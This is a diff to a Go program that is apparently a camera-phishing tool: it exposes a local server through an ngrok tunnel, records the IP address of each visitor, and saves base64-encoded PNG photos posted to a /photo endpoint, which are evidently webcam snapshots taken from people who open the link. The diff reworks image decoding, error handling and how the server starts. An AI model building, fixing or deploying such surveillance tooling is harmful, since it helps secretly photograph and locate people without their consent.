@@ -1,11 +1,11 @@
 package main
 
 import (
-	"bytes"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"image/png"
+	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
@@ -47,25 +47,29 @@ var (
 		"   00:1G  GGG| 0|      \n"
 )
 
+type photo struct {
+	Photo string `json:"img"`
+}
+
+func imagePNG(input string) io.Reader {
+	return base64.NewDecoder(base64.StdEncoding, strings.NewReader(input))
+}
+
 func saycheese(_ http.ResponseWriter, r *http.Request) {
 	log.Println("\nNew photo")
 	// decode the bodyrequest
-	var conf map[string]string
+	var conf photo
 
 	json.NewDecoder(r.Body).Decode(&conf)
 
 	// decode the base64
-	imageData, err := base64.StdEncoding.DecodeString(conf["img"][31:])
-	if err != nil {
-		fmt.Println("fuck", err)
-	}
-	
-	//  to bytes
-	d := bytes.NewReader(imageData)
+	imageData := imagePNG(strings.Replace(conf.Photo, "data:image/octet-stream;base64,", "", 1))
+
 	// decode the image
-	im, err := png.Decode(d)
+	im, err := png.Decode(imageData)
 	if err != nil {
-		fmt.Println("fuck")
+		log.Println(err)
+		return
 	}
 	//create the archive
 
@@ -79,6 +83,7 @@ func saycheese(_ http.ResponseWriter, r *http.Request) {
 	}
 	//save the archive
 	png.Encode(fs, im)
+
 }
 func writeIP(w http.ResponseWriter, r *http.Request) {
 	// create or open the file
@@ -109,6 +114,7 @@ func sayNgrok() {
 		// this is shit
 		cono++
 		sayNgrok()
+
 	} else if cono > 10 {
 		fmt.Println("I need ngrok!, if you don't have ngrok, try `sudo apt install ngrok`")
 		return
@@ -126,21 +132,17 @@ func sayNgrok() {
 
 func main() {
 	// clear the console
-	if err := exec.Command("clear").Run(); err != nil {
-		exec.Command("cli").Run()
+	var out []byte
+	out, err := exec.Command("clear").Output()
+	if err != nil {
+		out, _ = exec.Command("cls").Output()
 	}
+	fmt.Println(out)
 	// start the interface
+
 	fmt.Printf("\033[35m%s\n\033[0m", logo)
 	fmt.Println("\033[34mstarting  server \033[0m")
 
-	go func() {
-		// handlers request
-
-		http.HandleFunc("/", writeIP)
-		http.HandleFunc("/photo", saycheese)
-		http.ListenAndServe(":8080", nil)
-
-	}()
 	go func() {
 		// ejecuta el comando para ejecutar ngrok
 		fmt.Println("I need ngrok!, if you don't have ngrok, try `sudo apt install ngrok`")
@@ -151,6 +153,7 @@ func main() {
 		}
 	}()
 	sayNgrok()
-	for {
-	}
+	http.HandleFunc("/", writeIP)
+	http.HandleFunc("/photo", saycheese)
+	http.ListenAndServe(":8080", nil)
 }
